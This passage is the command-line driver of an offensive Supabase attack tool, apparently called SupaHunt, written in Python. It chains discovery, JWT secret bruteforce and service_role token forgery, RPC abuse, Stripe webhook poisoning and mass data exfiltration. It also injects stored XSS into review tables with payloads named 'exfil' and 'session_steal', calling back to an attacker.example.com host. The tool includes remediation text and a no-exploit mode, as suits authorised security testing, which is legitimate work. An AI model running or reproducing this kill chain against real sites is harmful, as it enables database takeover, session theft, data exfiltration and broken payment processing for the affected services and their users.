            impact="Complete denial of payment processing. Users who pay will "
                   "never receive their subscriptions or purchases.",
            remediation="Add RLS policies to webhook tables. Restrict INSERT to "
                        "service_role only.",
            cvss=9.8,
        )

    # 5. Cleanup unless --no-cleanup
    if not args.no_cleanup:
        cleaned = poisoner.cleanup(token)
        console.print(f"  [green]Cleaned up {cleaned} records[/]")

    return target, report, token


def cmd_reviews(args, target: SupabaseTarget = None, report: ScanReport = None,
                token: str = None):
    """Mass XSS review/comment injection across content catalog."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ MASS REVIEW/XSS INJECTION ═══[/]\n")

    injector = ReviewInjector(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    # Auto-discover + inject (fully adaptive to any schema)
    user_id = getattr(args, "user_id", None) or "00000000-0000-0000-0000-000000000000"
    payload = getattr(args, "xss_payload", "exfil")
    callback = getattr(args, "callback_url", "https://attacker.example.com")
    signature = getattr(args, "signature", "supahunt")

    results = injector.auto_inject(
        token=token,
        payload_name=payload,
        callback_url=callback,
        user_id=user_id,
        signature=signature,
    )

    if "error" in results:
        console.print(f"[yellow]{results['error']} — skipping[/]")
        return target, report, token

    # Count results
    total_injected = sum(
        r.get("total", 0) for r in results.get("injections", {}).values()
    )
    content_tables = list(results.get("discovery", {}).get("content_tables", {}).keys())

    if total_injected > 0:
        report.add_finding(
            title=f"Mass XSS injection: {total_injected} records across catalog",
            severity="CRITICAL",
            category="Stored XSS",
            description=f"Injected {total_injected} XSS entries via GraphQL "
                        f"INSERT mutation with zero RLS. Content targeted: "
                        f"{', '.join(content_tables)}.",
            evidence=json.dumps(results, indent=2, default=str),
            impact="Stored XSS executes for every user viewing affected content. "
                   "Can steal session tokens, cookies, and perform actions as victim.",
            remediation="Add RLS INSERT policies requiring authenticated user_id match. "
                        "Sanitize HTML in user-generated content server-side.",
            cvss=9.6,
        )

    # Save injected IDs for later cleanup
    output_dir = os.path.join(args.output, "reviews")
    os.makedirs(output_dir, exist_ok=True)
    id_file = os.path.join(output_dir, "injected_ids.json")
    injector.save_injected(id_file)

    # Cleanup unless --no-cleanup
    if not args.no_cleanup:
        cleaned = injector.cleanup(token)
        console.print(f"  [green]Cleaned up {cleaned} records[/]")

    return target, report, token


def cmd_rpc_abuse(args, target: SupabaseTarget = None, report: ScanReport = None,
                  token: str = None):
    """Auto-discover and exploit exposed RPC functions."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ RPC ABUSE TESTING ═══[/]\n")

    abuser = RPCAbuser(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    # 1. Auto-discover + classify + probe all RPCs
    results = abuser.probe_all(token=token, anon_only=(token is None))

    summary = abuser.summary
    console.print(f"\n  [bold]Discovered: {summary['total_probed']}[/]")
    console.print(f"  [bold red]Callable: {summary['callable_count']}[/]")
    console.print(f"  [green]Patched: {summary['patched_count']}[/]")

    # 2. Generate findings per callable RPC
    for category, rpcs in results.items():
        for rpc in rpcs:
            if rpc.get("callable"):
                report.add_finding(
                    title=f"RPC '{rpc['name']}' callable without auth",
                    severity=rpc["severity"],
                    category=f"RPC Abuse — {category}",
                    description=rpc["impact"],
                    evidence=f"HTTP {rpc['status']}: {rpc['response'][:200]}",
                    remediation="Add SECURITY INVOKER or explicit role check. "
                                "Restrict to service_role.",
                    cvss=9.8 if rpc["severity"] == "CRITICAL" else 7.5,
                )

    # 3. Test dynamic attack chains by category
    if summary["callable_count"] >= 2:
        console.print("\n  [bold red]Testing attack chains by category...[/]")
        for category in results.keys():
            callable_in_cat = [
                r for r in results[category] if r.get("callable")
            ]
            if len(callable_in_cat) >= 2:
                chain_result = abuser.execute_chain(
                    category=category, token=token,
                )
                if chain_result.get("executions"):
                    exec_count = sum(
                        len(e) for e in chain_result["executions"]
                    )
                    console.print(
                        f"  Chain '{category}': {exec_count} RPCs executed"
                    )

    return target, report, token


def cmd_forge(args, target: SupabaseTarget = None, report: ScanReport = None,
              token: str = None):
    """Token forgery — JWT bruteforce, HMAC token forging, ad event injection."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ TOKEN FORGERY ═══[/]\n")

    forger = TokenForger(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    # 1. JWT secret bruteforce
    console.print("  [bold]Phase 1: JWT Secret Bruteforce[/]")
    wordlist = None
    wordlist_path = getattr(args, "jwt_wordlist", None)
    if wordlist_path:
        wordlist = forger.load_wordlist(wordlist_path)
        console.print(f"  Loaded {len(wordlist)} candidates from {wordlist_path}")
    jwt_secret = forger.bruteforce_jwt_secret(wordlist=wordlist)

    if jwt_secret:
        report.add_finding(
            title=f"JWT secret cracked: {jwt_secret[:20]}...",
            severity="CRITICAL",
            category="Authentication",
            description=f"Supabase JWT signing secret matches a common/default value. "
                        f"Attacker can forge service_role tokens for FULL database access.",
            impact="Complete bypass of all Row Level Security. Full read/write/delete "
                   "access to every table including auth.users.",
            remediation="Rotate JWT secret immediately. Use a strong random value "
                        "(min 32 bytes). Invalidate all existing tokens.",
            cvss=10.0,
        )

        # 2. Forge service_role JWT
        console.print("  [bold]Phase 2: Forging service_role JWT[/]")
        forged = forger.forge_service_role_jwt(jwt_secret)
        if forged:
            verify = forger.verify_forged_jwt(forged)
            if verify.get("verified"):
                report.add_finding(
                    title="Forged service_role JWT VERIFIED — full DB access",
                    severity="CRITICAL",
                    category="Authentication",
                    description="A forged service_role JWT was accepted by the API. "
                                "Complete database access confirmed.",
                    evidence=f"JWT: {forged[:60]}...\nSample data: "
                             f"{json.dumps(verify.get('sample_data', []), indent=2)}",
                    cvss=10.0,
                )
                console.print("  [bold red on white] SERVICE_ROLE JWT VERIFIED [/]")
    else:
        console.print("  [dim]JWT secret not in default wordlist[/]")

    # 3. HMAC token forgery (if a secret was provided via --ad-secret)
    hmac_secret = getattr(args, "ad_secret", None)
    if hmac_secret:
        forger.add_secret("hmac_secret", hmac_secret)

        console.print("  [bold]Phase 3: HMAC Token Forgery[/]")
        test_token = forger.forge_api_token(
            hmac_secret, {"test_param": "test_value"},
        )
        if test_token:
            report.add_finding(
                title="HMAC API tokens forgeable with discovered secret",
                severity="HIGH",
                category="Token Forgery",
                description="API tokens can be forged using a hardcoded or weak "
                            "secret found in client-side source code.",
                impact="Token-protected endpoints can be called with forged tokens. "
                       "Enables analytics manipulation, fake events, etc.",
                remediation="Move token secret to server-side env variable. "
                            "Rotate the secret immediately.",
                cvss=7.5,
            )

    return target, report, token


def cmd_full(args):
    """Full kill chain: discover → enumerate → exploit → graphql → storage → filter → exfil → report."""
    print_banner()

    console.print(Panel(
        "[bold]Full Kill Chain Mode v3.0[/]\n"
        "discover → enum → exploit → graphql → storage → filters → exfil\n"
        "→ webhook-poison → review-xss → rpc-abuse → token-forge → report",
        title="[bold red]FULL SCAN[/]",
        box=box.DOUBLE,
    ))

    start = time.time()

    # 1. Discovery (v2)
    console.print("\n[bold white on blue] PHASE 1: DISCOVERY (v2) [/]\n")
    target, discovery_result = cmd_discover_v2(args)

    if not target.supabase_url or not target.anon_key:
        console.print("[bold red][!] Discovery failed. Aborting.[/]")
        return

    # 2. Enumeration
    console.print("\n[bold white on blue] PHASE 2: ENUMERATION [/]\n")
    target, tables, rpcs, report = cmd_enum(args, target)

    # Add discovery findings to report
    if discovery_result.get("secrets_found"):
        for stype, sval in discovery_result["secrets_found"]:
            report.add_finding(
                title=f"Secret leaked in JS: {stype}",
                severity="CRITICAL",
                category="Secret Exposure",
                description=f"{stype} found in client-side JavaScript bundle.",
                evidence=sval,
                remediation="Move secret to server-side environment variable.",
                cvss=9.0,
            )
    if discovery_result.get("source_maps"):
        report.add_finding(
            title=f"{len(discovery_result['source_maps'])} source maps exposed",
            severity="HIGH",
            category="Information Disclosure",
            description="JavaScript source maps are publicly accessible, "
                        "exposing full application source code.",
            remediation="Remove .map files from production or restrict access.",
        )
    if discovery_result.get("extra_supabase_projects"):
        for p in discovery_result["extra_supabase_projects"]:
            report.add_finding(
                title=f"Extra Supabase project: {p['ref']}",
                severity="MEDIUM",
                category="Information Disclosure",
                description=f"Additional Supabase project credentials found: {p['url']}",
            )

    # 3. Auth exploitation (unless --no-exploit)
    token = args.token
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 3: AUTH EXPLOITATION [/]\n")
        target, report, token = cmd_exploit(args, target, report)
    else:
        console.print("\n[dim]Skipping exploitation (--no-exploit)[/]")

    # 4. GraphQL mutation RLS testing
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 4: GRAPHQL MUTATION RLS [/]\n")
        try:
            target, report, token, gql_results = cmd_graphql_test(
                args, target, report, token
            )
        except Exception as e:
            console.print(f"[red]GraphQL testing error: {e}[/]")

    # 5. Storage audit
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 5: STORAGE AUDIT [/]\n")
        try:
            target, report, token = cmd_storage_audit(args, target, report, token)
        except Exception as e:
            console.print(f"[red]Storage audit error: {e}[/]")

    # 6. Filter injection
    if not args.no_exploit and tables:
        console.print("\n[bold white on blue] PHASE 6: FILTER INJECTION [/]\n")
        try:
            target, report, token = cmd_filter_test(
                args, target, tables, report, token
            )
        except Exception as e:
            console.print(f"[red]Filter injection error: {e}[/]")

    # 7. Exfiltration (unless --no-exfil)
    if not args.no_exfil and tables:
        console.print("\n[bold white on blue] PHASE 7: EXFILTRATION [/]\n")
        report = cmd_exfil(args, target, tables, token, report)
    else:
        console.print("\n[dim]Skipping exfiltration (--no-exfil)[/]")

    # 8. Webhook poisoning
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 8: WEBHOOK POISONING [/]\n")
        try:
            target, report, token = cmd_webhook(args, target, report, token)
        except Exception as e:
            console.print(f"[red]Webhook poisoning error: {e}[/]")

    # 9. Review/XSS injection
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 9: REVIEW/XSS INJECTION [/]\n")
        try:
            target, report, token = cmd_reviews(args, target, report, token)
        except Exception as e:
            console.print(f"[red]Review injection error: {e}[/]")

    # 10. RPC abuse
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 10: RPC ABUSE [/]\n")
        try:
            target, report, token = cmd_rpc_abuse(args, target, report, token)
        except Exception as e:
            console.print(f"[red]RPC abuse error: {e}[/]")

    # 11. Token forgery
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 11: TOKEN FORGERY [/]\n")
        try:
            target, report, token = cmd_forge(args, target, report, token)
        except Exception as e:
            console.print(f"[red]Token forgery error: {e}[/]")

    # 12. Report
    console.print("\n[bold white on blue] PHASE 12: REPORT [/]\n")
    md_path, json_path = report.save(args.output)

    elapsed = time.time() - start
    counts = report.severity_count()

    console.print(Panel(
        f"[bold]Scan Complete[/] — {elapsed:.0f}s\n\n"
        f"[bold red]CRITICAL: {counts['CRITICAL']}[/]  "
        f"[red]HIGH: {counts['HIGH']}[/]  "
        f"[yellow]MEDIUM: {counts['MEDIUM']}[/]  "
        f"[cyan]LOW: {counts['LOW']}[/]  "
        f"[dim]INFO: {counts['INFO']}[/]\n\n"
        f"Reports:\n  {md_path}\n  {json_path}",
        title="[bold green]RESULTS[/]",
        box=box.DOUBLE,
    ))


def cmd_scan(args):
    """Scan mode: discover + enumerate (no exploit)."""
    args.no_exploit = True
    args.no_exfil = True
    cmd_full(args)


# ══════════════════════════════════════════════
# CLI ARGUMENT PARSING
# ══════════════════════════════════════════════

def build_parser():
    parser = argparse.ArgumentParser(
        prog="supahunt",
        description="SupaHunt — Supabase Security Auditing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="command", help="Command to execute")

    # Common arguments
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("url", help="Target URL")
    common.add_argument("--supabase-url", help="Supabase URL (skip discovery)")
    common.add_argument("--anon-key", help="Supabase anon key")
    common.add_argument("--token", help="Auth bearer token")
    common.add_argument("--email", help="Email for account creation")
    common.add_argument("--password", help="Password for account creation")
    common.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    common.add_argument("--output", default="./output", help="Output directory")
    common.add_argument("--threads", type=int, default=10, help="Thread count")
    common.add_argument("--timeout", type=int, default=15, help="Request timeout (sec)")
    common.add_argument("--tables", help="Extra table names (comma-separated)")
    common.add_argument("--no-exploit", action="store_true", help="Skip exploitation")
    common.add_argument("--no-exfil", action="store_true", help="Skip exfiltration")
    common.add_argument("--no-cleanup", action="store_true", help="Keep test artifacts (don't clean up)")
    common.add_argument("--quiet", action="store_true", help="Minimal output")
    common.add_argument("--json", action="store_true", help="JSON output only")
    common.add_argument("--rate-limit", type=float, default=10.0,
                        help="Max requests/sec (default: 10)")

    sub.add_parser("discover", parents=[common], help="Auto-detect Supabase from URL")
    sub.add_parser("discover2", parents=[common], help="Enhanced discovery (v2: source maps, API probing, secrets)")
    sub.add_parser("scan", parents=[common], help="Recon scan (no exploitation)")
    sub.add_parser("enum", parents=[common], help="Enumerate tables, RPCs, storage")
    sub.add_parser("exploit", parents=[common], help="Run exploitation modules")
    sub.add_parser("graphql", parents=[common], help="GraphQL mutation RLS audit")
    sub.add_parser("storage", parents=[common], help="Storage bucket security audit")
    sub.add_parser("filters", parents=[common], help="PostgREST filter injection testing")
    sub.add_parser("exfil", parents=[common], help="Mass data exfiltration")

    # v2 attack modules
    webhook_p = sub.add_parser("webhook", parents=[common],
                               help="Webhook idempotency poisoning (Stripe)")
    webhook_p.add_argument("--events-per-type", type=int, default=100,
                           help="Fake events per Stripe event type (default: 100)")

    reviews_p = sub.add_parser("reviews", parents=[common],
                               help="Mass XSS review/comment injection")
    reviews_p.add_argument("--user-id", help="User ID for review injection")
    reviews_p.add_argument("--xss-payload",
                           choices=["minimal", "exfil", "session_steal",
                                    "defacement", "polyglot"],
                           default="exfil", help="XSS payload template")
    reviews_p.add_argument("--callback-url", default="https://attacker.example.com",
                           help="Callback URL for XSS exfiltration")
    reviews_p.add_argument("--signature", default="supahunt",
                           help="Signature tag on injected reviews")

    sub.add_parser("rpc-abuse", parents=[common],
                   help="Probe & exploit exposed admin RPCs")

    forge_p = sub.add_parser("forge", parents=[common],
                             help="Token forgery (JWT bruteforce, HMAC tokens)")
    forge_p.add_argument("--ad-secret", help="Known ad event token secret")
    forge_p.add_argument("--jwt-wordlist", help="Custom JWT secret wordlist file")

    sub.add_parser("full", parents=[common], help="Full kill chain (v3)")

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        print_banner()
        parser.print_help()
        sys.exit(0)

    commands = {
        "discover": lambda: cmd_discover(args),
        "discover2": lambda: cmd_discover_v2(args),
        "scan": lambda: cmd_scan(args),
        "enum": lambda: cmd_enum(args),
        "exploit": lambda: cmd_exploit(args),
        "graphql": lambda: cmd_graphql_test(args),
        "storage": lambda: cmd_storage_audit(args),
        "filters": lambda: cmd_filter_test(args),
        "exfil": lambda: cmd_exfil(args),
        "webhook": lambda: cmd_webhook(args),
        "reviews": lambda: cmd_reviews(args),
        "rpc-abuse": lambda: cmd_rpc_abuse(args),
        "forge": lambda: cmd_forge(args),
        "full": lambda: cmd_full(args),
    }

    try:
        commands[args.command]()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/]")
        sys.exit(130)
    except Exception as e:
        console.print(f"\n[bold red]Error: {e}[/]")
        if os.environ.get("DEBUG"):
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
